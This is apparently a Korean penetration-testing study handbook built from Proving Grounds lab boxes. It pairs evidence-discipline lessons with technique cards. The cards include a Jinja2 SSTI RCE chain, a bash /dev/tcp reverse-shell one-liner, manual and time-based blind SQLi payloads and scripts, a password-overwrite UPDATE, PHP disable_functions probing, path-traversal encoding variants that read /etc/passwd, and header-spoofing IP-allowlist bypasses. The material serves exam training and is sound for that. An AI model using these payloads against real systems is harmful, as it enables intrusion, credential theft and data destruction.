→ 같은 이유로 **`whoami; hostname; ipconfig; date; type <플래그>` 한 화면**을 그 자리에서 파일로 떨어뜨릴 것 — 값만 33바이트 적어두면 「언제·어느 세션에서」가 통째로 사라짐(C-3).
→ **인스턴스 사이의 재생성**(옛 노트 값으로 재제출 불가)과는 별개 층위임. 이쪽은 **한 세션 안**에서 벌어진 일임.

#### A-6-13. 도구가 `Unknown argument error` 만 뱉고 어느 인자가 틀렸는지 안 알려준다

**증상** — `.exe`·스크립트가 한 줄만 뱉고 죽음. 어느 옵션이 문제인지 표시가 없음.

[[Vault]] 실측 — SharpGPOAbuse 를 **세 번** 쳐서 통과했음(`파일보관\Pasted image 20260708132007.png`):
```powershell
.\SharpGPOAbuse.exe --AddlocalAdmin --GPO "Default Domain Policy" -- UserAccount anirudh
[!] Unknown argument error.
[!] Exiting...
.\SharpGPOAbuse.exe --AddlocalAdmin --GPO "Default Domain Policy" --UserAccount anirudh
[!] Unknown argument error.
[!] Exiting...
.\SharpGPOAbuse.exe --AddlocalAdmin --GPOName "Default Domain Policy" --UserAccount anirudh
[+] Domain = vault.offsec
```
첫 줄은 두 군데가 동시에 틀렸음 — `-- UserAccount`(하이픈 뒤 공백)와 **`--GPO`(정답은 `--GPOName`)**. 하나씩 고치면 왕복이 그만큼 늘어남.

→ **오류가 「어느 인자」를 안 알려주면 옵션을 하나씩 고치지 말고 `--help`·README 로 «전체 목록»을 먼저 받을 것.** 이름이 자연스러워 보이는 축약형(`--GPO`)은 실제로 없는 경우가 많음.
→ **통과한 문자열을 그대로 노트에 적고 「보기 좋게」 고치지 말 것.** [[Vault]] 에서 실제로 통과한 것은 `--AddlocalAdmin`(l 이 소문자)인데 이전 판 노트가 `--AddLocalAdmin` 으로 «정리»해 실측이 훼손돼 있었음.

#### A-6-14. 내가 찾아본 곳에 없다 ≠ 존재하지 않는다 — 부재 증거를 존재 부정으로 승격시키지 않는다

**[[Levram]] 실측 — 이 규율이 없어서 «정확했던 절이 삭제된» 사건.** 적대적 검증자가 `~/PG/` 와 `/tmp/gv/` 두 디렉터리만 보고 「정품 wheel 을 받은 적이 없다 → 대조한 적이 없다 → 날조」로 판정해 노트의 버전 판정 절(webpack 자산 30개 대조)을 통째로 지웠음. 실제로는 `pip` 가 받은 wheel 이 HTTP 캐시(`~/.cache/pip/http-v2/…/*.body`)에 남아 있었고, 그 캐시로 전항목을 재대조하니 **노트의 원 서술이 그대로 일치**했음(크기 26533바이트, `Gerapy v0.9.7` 문자열 0건까지, A-11).

**화살표마다 새 정보는 없는데 확신만 올라갔음:**
```text
"두 디렉터리에 없다"   ← 참 (관측)
  → "받은 적이 없다"    ← 도약
  → "대조한 적이 없다"  ← 도약
  → "날조다"            ← 단정
```
첫 칸만 사실이고 나머지 셋은 전부 추론임. **부재 증거의 등급 상한은 `근거부족` 이고, 그것이 정상 등급임**(`CLAUDE.md` §3).

⛔ **그렇다고 「어딘가엔 있을지 모른다」를 찾아 파일시스템을 헤매지도 말 것.** `find /`·홈 전체 grep·`~/PG` 전수 스캔은 **금지임.** 실측 — 그렇게 훑은 감사 3건이 판정을 **하나도 바꾸지 못했고**(Nagoya 73분에 등급 한 칸, Cockpit 68분에 히트 1건이 오탐, Hutch 는 실제로 뒤집은 것이 포털 `0/2` 라는 **양성 증거**였음) 감사 시간의 최대 항목이었음.
**이유는 정책에 있음** — 이 프로젝트는 **풀면서 증적을 수집하고 수집 안 된 것은 쓰지 않음**(`CLAUDE.md` §2). 그러므로 출처가 없으면 **찾을 것이 아니라 「관측 없음」으로 적을 것.**

**확인은 «고정된 출처 목록» 안에서만 할 것:**
- `~/PG/<박스>/` — 1차 출처. 수집 정책 이후의 박스는 사실상 여기가 전부임
- 볼트 `파일보관\` 스크린샷 — `Pasted image <YYYYMMDDHHMMSS>.png` 는 **파일명이 촬영 시각 그 자체**임
- `~/.zsh_history` — 단 **리버스셸 «안»에서 친 명령은 여기 안 남음**
- `_AUDIT\portal-진행도-실측-20260820.md` — 283개 박스 플래그 진행도. **부재로 추론하기 전에 이 양성 증거를 먼저 볼 것**
- (레거시 노트 한정) 패키지 매니저 캐시 `~/.cache/pip`·`~/.gem`·`~/.npm` · `/tmp` · `__pycache__` mtime

**목록 밖으로 나가지 말 것.** 여기에 없으면 등급은 `근거부족` 이고 판정을 보류하는 것이 정답임.
→ **반대 방향도 같은 규율임 — 작성할 때도.** 하지 않은 대조를 근거로 세우지 말고, 한 대조는 **재현 절차와 함께** 적을 것. 결론만 적힌 관측은 나중에 스스로도 증명하지 못함(A-63 · A-64).

## B. 기법 카드 — 이 서비스를 봤을 때

### B-1. 웹

#### B-11. SSTI (Jinja2 / Flask)

**탐지 신호** — Flask 기본 포트(5000), 사용자 입력이 서버 템플릿으로 렌더되는 지점(알림 본문·프로필·제목·템플릿 편집기). 입력 필드에 `{{7*7}}` → `49` 면 확정.

**표준 탈출 체인**
```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**함정**
- `SandboxedEnvironment` 면 이 체인은 **첫 홉(`__init__` 접근)에서 `SecurityError`** 로 막힘 → 다른 gadget 필요
- **`popen(...).read()` 는 블로킹임** → A-32. `setsid nohup ... &` 로 떼어낼 것
- **트리거가 「저장」인지 「테스트 발송」인지 확인할 것.** [[Detection]]: PoC 대로 `Send test notification` 만 눌렀으면 못 뚫었음 — test 는 저장값이 아니라 기본 제목·본문을 보내 SSTI 가 안 탐. 실제 트리거는 **설정 저장**. 두 근거로 확정:
  - ⓐ **시각** — `http80.log` 의 root 콜백(13:41:54)이 `nc443.log` 에 apprise POST 가 찍힌 시각보다 **앞섬**
  - ⓑ **내용(더 강함)** — 저장값이 SSTI 페이로드였는데도 그 apprise POST 의 title·message 가 **둘 다 기본 문구**였음. 시각 비교와 달리 「test 는 저장 본문을 아예 안 쓴다」를 내용만으로 보여줌. 실측 원문(출처 `~/PG/Detection/listener/nc443.log`):
    ```json
    {"version": "1.0", "title": "ChangeDetection.io Notification - http://192.168.248.97:5000/settings", "message": "http://192.168.248.97:5000/settings had a change.\n---\n\n---", "attachments": [], "type": "info"}
    ```
- **출력이 안 돌아오는 sink 의 디버깅** — stderr 를 base64 로 아웃바운드 콜백에 실을 것(A-31 의 4번 형태). SSTI 는 렌더 결과가 화면에 안 오는 경우가 많아 이것이 사실상 유일한 피드백 채널
- **바깥 Jinja2 문자열과 안쪽 셸 명령에 같은 종류의 따옴표를 쓰지 말 것.** [[Detection]] 에서 A-31 의 egress 진단 페이로드가 이것으로 한 번 깨짐 — 관측된 사실은 **셸이 인자 끝에 짝 없는 `"` 를 그대로 받았다**는 것이고, 바깥 Jinja2 문자열이 안쪽 따옴표에서 조기 종료됐다는 것은 거기서의 추론임 [가정]. 회수한 stderr base64 를 디코드한 원문:
  ```text
  /usr/bin/bash: line 53: 443": Servname not supported for ai_socktype
  /usr/bin/bash: line 53: /dev/tcp/192.168.45.207/443": Invalid argument
  ```
  ⚠️ **증거 등급** — 이 실패 콜백 줄은 `http80.log` 에 **없음**(로그에는 성공한 `GET /diag443-` 만 있음). 출처는 `~/PG/Detection/writeup_notes.txt` 13:44 에 남은 base64 원문뿐임
  - 부수 효과로 **「stderr 를 base64 아웃바운드 콜백으로 빼는 것」 자체가 blind SSTI 의 유일한 피드백 채널**임이 드러남(바로 위 항목)
  - 산출물 실제 형태 — `p1.j2`·`p3_revshell.j2` 는 바깥 큰따옴표 + 안쪽 따옴표 없음, `p4_diag.j2`·`p6_sshkey.j2` 는 바깥 홑따옴표 + 안쪽 큰따옴표. 규칙은 「홑/큰」 고정이 아니라 **「안팎을 다르게」**

**수동 리버스셸 대안(자동 도구 없이)**
```bash
bash -c 'setsid nohup bash -i >& /dev/tcp/<LHOST>/<PORT> 0>&1 &'
```
반드시 `&` + `setsid` 로 분리(A-32). [[Detection]] 에서는 이 형태를 **실제로 쓰지 않았고 검증되지 않음** [가정] — 실사용은 SSH 키 심기(더 안정적, msfvenom 불필요).

**출처** — [[Detection]](CVE-2024-32651, changedetection.io ≤0.45.20)


**표현식 주입은 언어마다 마커만 다른 «한 가족»임 — 입력이 되비치는 자리에 차례로 넣어 볼 것.**

| 마커 | 엔진 | 대표 제품 |
|---|---|---|
| `${7*7}` | **OGNL** | Confluence · Struts2 · Atlassian WebWork |
| `${7*7}` | SpEL | Spring |
| `{{7*7}}` | Jinja2 · Twig | Flask · Django · Symfony |
| `%{7*7}` | OGNL(Struts2 태그 컨텍스트) | Struts2 |
| `<%= 7*7 %>` | ERB · JSP | Rails · Java 웹앱 |
| `<#assign x=...>` | Freemarker | Java 웹앱 |

**`49` 가 렌더되는 순간이 분기점임.**

**Java 판(OGNL)의 특징 — [[Flu]] · CVE-2022-26134:**
- **파라미터도 헤더도 아니고 «URI 경로 세그먼트»가 페이로드가 될 수 있음.** 그래서 WAF·로그 필터가 자주 놓침. `/${...}/` 처럼 **닫는 슬래시**가 필요한 경우가 있음(액션 매핑이 네임스페이스로 잘라내야 하므로)
- **`.action` / `.do` 확장자는 Struts2·WebWork 신호임.** nmap 의 `Requested resource was /login.action?...` 한 줄이 Flu 의 방향을 정했음
- OGNL 은 메서드 호출·`Class.forName`·객체 생성이 전부 되는 완전한 표현식 언어라 **평가 컨텍스트에 닿는 것 자체가 RCE** 임
- 실행 수단은 **`javax.script.ScriptEngineManager` → `nashorn` → `ProcessBuilder`** 가 고전 패턴임. 인용 계층이 줄고, 평가 주체가 바뀌어 OGNL 블랙리스트를 비껴감
- ⚠️ **Nashorn 은 JDK 11 deprecated · JDK 15 제거(JEP 335/372).** 제거된 런타임에서는 `getEngineByName("nashorn")` 이 `null` 이고 `.eval()` 이 NPE 로 죽음 — **결함은 그대로인데 페이로드만 불발함.** 「안 통한다」의 원인이 결함 부재가 아니라 **페이로드 부적합**일 수 있음
- **번들 JRE 를 볼 것** — Flu 는 `/opt/atlassian/confluence/jre/bin/java` 가 11.0.14.1 이었고 OS 의 `java` 와 무관했음. `ps` 의 첫 인자가 실제 경로임
- **`bash -c` 로 감쌀 것** — `/dev/tcp` 는 bash 내부 가상 경로라 `ProcessBuilder().command('bash','-i','>&',...)` 처럼 직접 넘기면 `>&` 가 리다이렉션이 아니라 문자열 인자가 되어 실패함

#### B-12. SQLi 수동 UNION — sqlmap 금지 대비

**시험에서 `sqlmap` 은 명시적 금지임**(E 절). 수동 절차를 반드시 익힐 것.

**수동 SQLi 절차 6단계**
1. `'` 로 주입 확인 — 쿼리가 깨지는지(0행) 확인 후 `--` 로 남은 쿼리를 주석 처리해 복귀하는지 대조
2. `ORDER BY n` / `UNION SELECT NULL×n` **병행**으로 컬럼 수 확정 — 두 방법이 일치하면 확실
3. 상수(`1,2,3,4…`)로 출력 위치(화면의 어느 열에 렌더되는지) 확인
4. **DB 엔진 지문** — `sqlite_version()`/`@@version`/`version()` 을 한 번에 배치로 쏘고 어느 것이 통하는지로 판정
5. 스키마 열거 — SQLite 는 `sqlite_master`, MySQL/PostgreSQL/MSSQL 은 `information_schema`
6. 덤프 — 확정된 컬럼 위치에 원하는 컬럼을 실어 UNION

**엔진 지문 치트시트** — `information_schema` 를 던졌는데 0행(빈 결과, 오류 아님) + `sqlite_version()` 이 통함 = **SQLite**. `@@version` 이 통함 = MySQL/MSSQL. `version()` 이 통함 = MySQL/PostgreSQL. `sqlite_sequence` 가 스키마 목록에 있으면 그 자체로 SQLite 확증(AUTOINCREMENT 내부 테이블).

**함정 — DB 엔진 오판이 가장 큰 헛짚음.** [[Robust]]: MySQL 을 가정하고 `version()`·`database()`·`user()`·`information_schema.tables` 를 먼저 던졌고 전부 **0행**. 「빈 결과 = 주입 실패」로 오독할 뻔했으나, 앞서 `UNION SELECT NULL,NULL,NULL,NULL` 은 정상이었으므로 「주입은 되는데 함수만 실패」= **엔진 불일치**로 판단. `sqlite_version()` 한 방으로 SQLite 확정(값 `3.28.0`). 교훈: **주입 가능(구조) ≠ 함수 호환(엔진).** 컬럼 수부터 확정한 뒤 엔진 지문을 따로 찍을 것.

```text
' UNION SELECT NULL,NULL,NULL,NULL--                → 정상 (구조는 됨)
' UNION SELECT 1,version(),3,4--                    → 0행 (MySQL 함수 실패 — 엔진 오판 신호)
' UNION SELECT 1,sqlite_version(),3,4--             → 정상, 값 `3.28.0` ← SQLite 확정
' UNION SELECT 1,name,sql,4 FROM sqlite_master--     → 정상 (스키마 노출)
```
— 출처: `~/PG/Robust/fp/`

**이름이 비슷한 테이블에 속지 말 것** — [[Robust]]: 화면에 보이던 목록은 `emps`(생년월일 등)였고 `password` 컬럼을 가진 것은 별개 테이블 `employees`. 스키마 열거 결과를 눈으로 다 훑고 덤프 대상을 고를 것.

**응답의 «구조»가 주입 성공의 증거가 됨.** 오류 메시지가 안 뜨는 in-band 주입에서 판정 신호는 「행이 렌더됐는가」인데, 그보다 강한 신호가 하나 더 있음 — **정상 스키마라면 나올 수 없는 모양.**

[[Graph]] 실측 — `users(searchTerm)` 응답 배열에 정확히 6원소:
```json
{"data":{"users":["admin","admin:$6$PRyGjElQ$…","jane","jane:$6$4BlcfbYDsQp3BMG$…","josh","josh:$6$g744Ii0AvY$…"]}}
```
「이름」 3개와 「이름:해시」 3개가 **나란히** 나옴. 원래 필터 질의(`WHERE username LIKE '%…%'` 로 이름만 반환)에 `UNION SELECT` 로 이름과 해시를 이어붙인 두 번째 질의를 덧붙였을 때 나오는 전형적 모양임. 「단독 → 그 이름:해시」 순 배치도 두 결과를 합쳐 사전순 정렬하면 그대로 나옴(`admin` 이 `admin:$6$…` 의 접두라 먼저 옴).

→ **응답에 「식별자」와 「식별자+비밀 조합」이 섞여 나오면 그 자체를 주입 성공 판정에 쓸 것.** 백엔드 엔진을 모르는 상태(GraphQL 뒤에 무엇이 있는지 안 보임)에서도 이 신호는 유효함(B-1-15).

**주입 위치가 `LIMIT` 절 «뒤»면 UNION 을 접고 스택·time 을 볼 것.** [[Pebbles]] 의 `limit` 은 문자열 리터럴 «안»이 아니라 **이미 완성된 SELECT 의 꼬리**에 붙었음 — 따옴표를 탈출할 필요가 없는 대신, `UNION SELECT` 로 컬럼 수를 맞춰 끼우기가 문맥상 까다로움. 문자열 리터럴 안에 끼어드는 [[Hawat]] 형과 갈리는 지점이고, **주입 위치의 SQL 문맥이 채널 선택을 먼저 제약함.** 대체 절차는 B-1-25(time-based blind 카드).

**교차 검증 습관 하나 — 크랙한 평문이 다른 출처와 맞는지 대조할 것.** [[Pebbles]] 는 `mysql.user` 의 `zmuser` 해시 `*C1D2D6FC5C596AFB19FFC4331DF6DAA287749A3E` 가 `zmpass` 로 풀렸고, 별도로 `LOAD_FILE` 로 읽은 `config.php` 원문에도 `'password' => 'zmpass'` 가 있었음 — **서로 독립한 두 출처가 일치**해 양쪽을 검증함.

⚠️ **MySQL `PASSWORD()` 해시는 로컬에서 직접 계산해 대조할 것** — `'*'+SHA1(SHA1_binary(pw)).hex().upper()`. [[Pebbles]] 원 노트는 `*4ACFE3202A5FF5CF467898FC58AAB1D615029441` 을 「잘 알려진 `password` 의 해시」로 단정했으나 **직접 계산하니 `admin`** 이었음(`password` 의 해시는 `*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19`). 「잘 알려진 해시」라는 기억은 근거가 아님. (2026-08-26 로컬 재계산으로 확인.)

**출력 채널이 «셋 다» 막힌 SQLi — 남는 것은 time-based 와 부작용뿐임.** [[Hawat]] 은 소스를 손에 넣어 이 판정을 **주입을 던지기 전에** 내렸고, 그 덕에 UNION 추출로 헤매지 않았음.

| 소스의 이 줄 | 죽는 채널 |
|---|---|
| `stmt.executeQuery(query);` — 반환값을 변수에 안 담음 | 결과가 화면에 안 나옴 → **UNION 추출 불가** |
| `catch { e1.printStackTrace(); }` — 예외를 삼킴 | 에러가 응답에 안 나옴 → **에러 기반 불가** |
| `service.GetAll()` — 주입과 무관하게 항상 전체 목록 렌더 | 응답 길이로도 구분 불가 → **Boolean 기반도 어려움** |

→ **남는 채널 둘** — ① time-based blind(`SLEEP()`) ② 부작용(`INTO OUTFILE` 파일 쓰기).
⛔ **스택 쿼리(`; DROP …`)는 JDBC 에서 기본 불가** — MySQL Connector/J 의 `allowMultiQueries` 기본값이 `false` 이고 [[Hawat]] 의 JDBC URL(`application.properties`)에 그 파라미터가 없음. **JDBC URL 을 손에 넣으면 이 한 가지를 먼저 볼 것.**

**time-based 오라클을 셸 함수로 «고정»하고 재사용할 것** — 조건만 인자로 받게 만들면 그 뒤 모든 판정이 한 줄이 됨:
```bash
#!/bin/bash
# $1 = SQL boolean condition. Prints elapsed time; >4s == TRUE
T=$(curl -s -o /dev/null -w '%{time_total}' -m 60 -b ~/PG/Hawat/cj.txt   -X POST 'http://192.168.248.147:17445/issue/checkByPriority'   --data-urlencode "priority=Normal' UNION SELECT IF(($1),sleep(5),0)-- ")
echo "[$T] $1"
```
— 출처: `~/PG/Hawat/oracle.sh`

**한 글자 추출은 «이진 탐색 + 병렬»로.** 선형 비교(256회)가 아니라 `ASCII(SUBSTRING(expr,i,1))>mid` 이진 탐색 8회로 한 문자를 확정하고, 문자 «위치»별로 스레드를 나눔. 지연도 5초가 아니라 **1.5초로 낮추고 임계를 1.0초**로 잡음:
```python
def getchar(expr,i):
    lo,hi=0,255
    while lo<hi:
        mid=(lo+hi)//2
        if ask('ASCII(SUBSTRING(%s,%d,1))>%d'%(expr,i,mid)): lo=mid+1
        else: hi=mid
    return lo
```
— 출처: `~/PG/Hawat/blind.py`(16 워커 `ThreadPoolExecutor`)
⚠️ 임계를 낮추면 네트워크 지터에 오탐이 남 — `ask()` 가 예외 시 3회 재시도하는 이유임. 지연값·임계는 baseline(이 박스는 0.18초) 대비로 정할 것(A-67).

**`-- ` 뒤의 «공백»이 필수임** — MySQL 은 `--` 다음에 공백·개행이 있어야 주석으로 인식함. `--data-urlencode` 를 쓰는 이유가 이것(그리고 `'`·`(`·`)`)을 손으로 인코딩하다 깨뜨리지 않기 위함임.

**`INTO OUTFILE` 전에 셋을 확인할 것** — ①DB 사용자의 `FILE` 권한 ②`@@secure_file_priv` ③**대상 디렉터리가 mysqld 소유자에게 쓰기 가능한가.** 셋 중 실질 관문은 ③임. 단 **변수값보다 실측이 우선**(A-61) — `/tmp` 마커 파일을 실제로 써 볼 것.

**시험 출제 가능성** — XFF 우회(B-15) + 수동 SQLi 조합은 웹 초급 박스의 정석 패턴.

**출처** — [[Robust]](SQLite UNION, 컬럼 4개, `employees` 테이블 덤프) · [[Graph]](GraphQL 인자 주입) · [[Hawat]](출력 채널 3개 봉쇄, JDBC) · [[Pebbles]](`LIMIT` 뒤 주입). 시간 배분은 D 절.

**⛔ `' or 1=1--` 이 실패해도 SQLi 가 «없는» 것이 아님.** 로그인 폼에 던졌는데 로그인이 안 되면 「SQLi 아니네」 하고 폼을 떠나기 쉬운데, SQLi 가 있어도 그 페이로드가 안 통하는 경우가 많음:
- 앱이 먼저 사용자를 조회한 뒤 **해시를 코드에서 비교**하면 `or 1=1` 로 행이 반환돼도 해시 비교에서 걸림([[Butch]] 가 이 구조라 해시를 덮어쓴 것)
- `password` 필드에만 인젝션이 있고 `username` 엔 없을 수 있음
- 주석 문법이 DBMS 와 안 맞음(T-SQL 은 `--` 만으로 줄 끝까지, MySQL 은 `--` 뒤에 **공백·개행 필수**)

**판정 기준은 `'` 하나로 에러가 나는가임.** 순서는 `'`(에러) → `''`(정상 복귀) → `' or '1'='1`(동작 변화). `''` 로 에러가 사라지는지 확인하는 1초가 단순 500 오탐을 걸러냄. [[Butch]] 는 본격 페이로드보다 먼저 최소 입력으로 반응을 본 순서가 정답 루트였음(스크린샷 `Pasted image 20260818110543.png` 가 `'` 입력 후 예외 원문).

**⛔ 그리고 «파괴적 쓰기» 전에 «읽기»를 먼저 시도할 것.** `UPDATE` 로 비밀번호 해시를 덮어쓰면 로그인은 되지만 대가가 셋임:
1. **원본 해시가 영구 소실됨** — 그 해시가 다른 서비스(FTP·SMB·WinRM)에서 재사용됐을 가능성을 검증할 기회를 스스로 없앰. [[Butch]] 는 타겟 정지로 이제 확인 불가
2. **되돌릴 수 없음.** 랩은 Revert 로 되지만 실무 침투테스트에서는 계약 위반이 될 수 있음(C-5)
3. **탐지됨.** 정상 사용자가 로그인 못 하게 되므로 즉시 신고가 들어옴

더 나은 순서는 **에러 기반·UNION 으로 원본 해시를 먼저 뽑고 → 크랙 시도 → 실패하면 그때 덮어쓰는 것**임. 원본을 손에 쥐고 있으면 원상복구도 가능함:
```sql
'; update users set password_hash='<원본해시>' where username='butch'; --
```
⚠️ **`where` 절을 빠뜨리지 말 것** — 테이블 전체의 비밀번호가 날아가면 앱의 다른 계정으로 돌아갈 길과 본인 재접근까지 함께 죽음. 되돌릴 방법은 revert 뿐이고 revert 하면 그 머신의 진척이 전부 사라짐(A-68).

#### B-13. disable_functions 우회 (PHP)

**후보군이 유한하고 알려져 있음 — 순차로 더듬지 말고 배치로 쏠 것**(D 절).
```sh
for p in exec system passthru shell_exec popen proc_open; do
  curl -s ... "&hfoo=$p&..." > "try_$p.html"
done
grep -l "uid=" try_*.html
```
부수 효과로 **안 통한 후보 파일이 전부 남아 그대로 시행착오 재료가 됨.**

**탐지 신호** — PHP RCE 가 **「응답은 200 으로 정상인데 출력 구간만 비어 있다」**면 disable_functions 를 의심할 것. `exec` 가 막혀도 `system`·`passthru`·`shell_exec`·`popen`·`proc_open` 중 하나는 대개 열려 있음.

⚠️ **순차 프로빙으로 시간을 태운 실측이 이 카드의 출처임.** [[GLPI]] 는 `hhook=exec` 계열을 하나씩 스무 번 가까이 던졌고 응답은 전부 정상 페이지였으나 출력 구간이 비어 있었음. 첫 시도 `rce_a.html`(22:52:00 UTC) → 성공 `am_id.html`(23:01:41 UTC) = **9분 41초 소모.** 실패 산출물 18개(`poc_id.html`·`m_id.html`·`m_sleep.html`·`mphp.html`·`mtag.html`·`t1~t3.html`·`phpinfo.html`·`passwd_raw.html`·`out_matched.html` 등)가 그대로 남아 있음. 0바이트 `htmLawed_src.php`(22:53 UTC)도 같은 구간의 기록 — 테스트 페이지의 PHP 원본을 받아보려다 빈 응답을 받았다는 뜻.

**`system` 을 콜백으로 우회하는 `array_map`→`call_user_func` 체인이 이 박스의 수동 대안 그 자체임**(자동 도구 아님).

**출처** — [[GLPI]](htmLawed 1.2.6 `call_user_func`/`array_map` 경유, CVE-2022-35914).

**언어 무관 원칙 — 표준 라이브러리의 실행 함수가 잘렸으면 «제품 확장 API» 를 노릴 것.** 설계자는 표준 위험 함수부터 지우고 **자기 제품이 추가한 확장 API 는 지우는 것을 잊음.** 절차는 셋임 — ①예외를 잡아 응답에 노출(관측 장비부터 만듦) ②후보 함수를 목록으로 순회 ③살아 있는 것을 씀.

[[Hub]] — FuguHub 의 LSP(Lua) 샌드박스가 `io.popen` 을 nil 로 제거(표준 Lua 라면 호출 시 `attempt to call a nil value (field 'popen')`). `pcall(function() return ba.exec(c) end)` 로 감싸 에러까지 응답에 찍고, Barracuda 런타임 확장 `ba.exec()` 가 살아 있어 stdout 캡처 → `uid=0`. **표준 함수가 막혔다는 사실 자체가 「커스텀 API 는 안 막혔다」는 힌트임.**

언어별 후보 — Lua `os.execute`·`ba.exec`·`load()` / PHP `exec`·`shell_exec`·`proc_open` / Python `subprocess.*`·`__import__('os')` / JSP `ProcessBuilder`·`ScriptEngine` / Node `execSync`·`spawn`.

#### B-14. traversal 을 손으로 칠 때 `--path-as-is`

**curl 은 기본적으로 `../` 를 보내기 전에 접음**(실측 확인, RFC 3986 §5.2.4 remove_dot_segments). 브라우저 주소창도 같음.

([[Clue]] — 이것이 `49362.py` 없이 같은 결과를 얻는 수동 대안이었음)

**그래서 서버는 트래버설을 «본 적도 없이» 404 를 돌려줌.**
```text
내가 친 것:    /public/plugins/alertlist/../../../../../../../../etc/passwd
curl 이 보낸 것: /etc/passwd            ← 서버 입장에서는 그냥 없는 경로
서버 응답:      404
```
`curl -v` 로 요청 라인을 보면 축약된 경로가 그대로 찍힘 — `> GET /etc/passwd HTTP/1.1`. **취약점도 페이로드도 멀쩡하고 내 클라이언트만 잘못인 상태**인데 화면에는 「그 파일이 없다」는 지극히 평범한 404 가 찍힘. 그래서 「패치됐나 보다」로 오독하기 쉬움(A-12 의 쌍둥이 명제).

**도구별 정규화 차이:**

| 도구 | 기본 동작 | 원문 그대로 보내려면 |
|---|---|---|
| `curl` | 정규화함 | **`--path-as-is`** |
| `wget` | 정규화함 | 확실한 억제 옵션이 없음. `curl` 로 갈아탈 것 |
| 브라우저 주소창 | 정규화함 | 개발자도구 fetch 로도 정규화됨. 프록시를 쓸 것 |
| Burp Repeater | 안 함(원문 전송) | 그대로 |
| `python3 requests` | 기본은 정규화하지 않으나 리다이렉트·세션에서 재구성될 수 있음 | 확인 후 사용 |
| 생 소켓(`nc`·`openssl s_client`) | 안 함 | 가장 확실한 최후 수단 |

**생 소켓 최종 심판 — 정규화 계층이 하나도 없어 내가 친 바이트가 그대로 도착함:**
```bash
printf 'GET /public/plugins/alertlist/../../../../../../../../etc/passwd HTTP/1.1\r\nHost: <타겟>:3000\r\nConnection: close\r\n\r\n' | nc <타겟> 3000
```

**⛔ 트래버설이 404 면 «순서대로» 확인할 것. 1번을 건너뛰고 2~5번을 돌면 영원히 안 됨:**
1. `curl -v` 로 실제 전송된 요청 라인 확인 → 축약됐으면 `--path-as-is`
2. `../` 개수를 **8~12** 로 늘림 — 루트에서 `..` 는 다시 루트(`/.. == /`)라 넘쳐도 무해함. **깊이를 계산하느라 시간을 쓰지 말 것**
3. 플러그인 ID·경로 세그먼트를 실측값으로 교체(B-1-29 의 `/metrics`)
4. 인코딩 변형 사다리 — 서버 앞단(리버스 프록시·WAF)이 `..` 를 거를 때:
   ```text
   ../                (기본)
   ..%2f              (슬래시만 인코딩)
   %2e%2e%2f          (점까지 인코딩)
   ..%252f            (이중 인코딩 — 프록시가 한 번 디코딩할 때)
   ....//             (필터가 ".." 를 «한 번만» 제거할 때 복원됨)
   ..%c0%af           (구형 서버의 오버롱 UTF-8)
   ```
5. 생 소켓(`printf | nc`)으로 최종 확인

**출처** — [[Clue]] · [[Fanatastic]](CVE-2021-43798, Grafana 8.3.0). 방어 메커니즘과 Go `filepath.Join` 함정은 B-1-26, 무엇을 읽을지는 B-1-27.

**같은 「넉넉히 넣기」 원칙이 HTTP 밖에서도 성립함.** [[Twiggy]] — salt `wheel file_roots.write` 트래버설에서 `/srv/salt`(루트에서 2단계) 대비 `../` 를 **5개** 넣었음. 필요한 것은 2개뿐이었으나 초과분은 무해함(`/.. == /`). **깊이를 정확히 셀 필요 없이 넉넉히 넣는 것이 실전적**임을 다른 프로토콜에서 재확인한 것 — 위 4번 「인코딩 변형 사다리」와 달리 이 항목은 **프로토콜을 안 가림.**

#### B-15. 헤더 기반 IP 접근제어 우회

**탐지 신호** — IP 화이트리스트 메시지("Your IP is not allowed…")가 뜨는데 접속 IP 는 못 바꿈. 앱이 클라이언트 IP 를 **어디서 읽는가**가 관건 — 헤더를 신뢰하면 위조 가능.

**배경** — 리버스 프록시(nginx·CloudFlare 등) 뒤 앱은 `$_SERVER['REMOTE_ADDR']` 이 프록시 IP 로 고정되므로 원 클라이언트 IP 를 `X-Forwarded-For` 같은 헤더로 전달받음. 앱이 이 헤더를 접근제어 판단에 **직접** 쓰면, 프록시가 없는 직결 환경에서도 클라이언트가 헤더를 위조해 임의 IP 를 사칭 가능.

**후보 헤더 12종을 한 번에 배치로 쏠 것**(D 절) — 순차로 하나씩 시험하지 말 것:
`X-Forwarded-For`·`X-Real-IP`·`X-Originating-IP`·`X-Client-IP`·`Client-IP`·`X-Forwarded-Host`·`X-Remote-IP`·`X-Remote-Addr`·`X-Host`·`True-Client-IP`·`X-Custom-IP-Authorization`·`Forwarded-For`. 통하는 것은 대개 **하나뿐.**
⚠️ RFC 7239 의 `Forwarded` 는 이 12종에 **없음** — [[Robust]] 에서 실제로 쏜 것은 `Forwarded-For` 였음(`~/PG/Robust/xff/` 파일명 12개로 확인). 목록에 추가해 함께 쏠 것.

```text
200 1770 X-Forwarded-For       ← 로그인 폼 노출 (게이트 통과)
200 90   X-Real-IP             ← "not allowed" (90B, 나머지 11종도 동일)
```
— 출처: [[Robust]] `~/PG/Robust/xff/`(12개 응답 본문 전량 보존)

```bash
curl -s -H "X-Forwarded-For: 10.10.10.1" http://<타겟>/login.php
```

**통과 후에도 계속 필요함** — 게이트를 한 번 통과했다고 세션이 유지되는 게 아니라, **이후 모든 요청에 같은 헤더를 계속 붙여야 함.** 화이트리스트 대역 안 임의 값이면 통과.

**403 은 실패가 아니라 정보임 — 「IP 기반 인가가 켜져 있다」는 뜻임.** 그때 찾을 것은 둘.
1. `X-Real-IP`·`X-Forwarded-For`·`X-Originating-IP` 로 그 판정을 속일 수 있는가
2. **같은 서비스 안에 요청을 «대신 발행해 주는» 기능이 있는가** — batch · webhook · proxy · health-check · import-from-URL

[[Flimsy]] 의 답은 ②였음. **서버가 자기 자신에게 거는 요청은 어차피 루프백에서 오므로 IP 허용목록이 통째로 무의미해짐.** APISIX 2.8 의 `batch-requests` 가 하위 요청을 루프백으로 재발행하면서 호출자 헤더까지 그대로 실어(2.8 `batch-requests.lua` 에 클라이언트 IP 재설정 코드가 없음) 두 방향 모두로 통과함(B-1-35).
- **헤더는 두 군데에 넣어도 손해 없음** — 2.8 의 `set_common_header()` 는 ① 본문 `headers` 를 하위 요청에 먼저 깔고 ② 바깥 요청 헤더로 **아직 안 채워진 키만** 메움. 안쪽이 우선, 바깥은 예비. **헷갈리면 본문 `headers` 쪽 하나면 됨**
